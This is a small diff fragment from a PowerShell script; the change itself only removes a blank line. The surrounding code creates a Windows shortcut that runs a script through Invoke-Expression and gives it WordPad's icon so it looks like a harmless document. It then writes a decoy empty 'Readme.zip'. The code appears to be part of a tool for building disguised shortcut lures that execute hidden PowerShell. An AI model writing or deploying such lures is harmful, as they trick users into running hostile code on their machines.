@@ -30,7 +30,6 @@ $link.arguments = "Get-Content $ps1 | Invoke-Expression"
 $link.iconlocation = "C:\Program Files (x86)\Windows NT\Accessories\WordPad.exe"
 $link.save()
 
-
 $zipFile = Join-Path -Path $curDir -ChildPath "Readme.zip"
 Set-Content $zipFile ("PK" + [char]5 + [char]6 + ("$([char]0)" * 18))
 
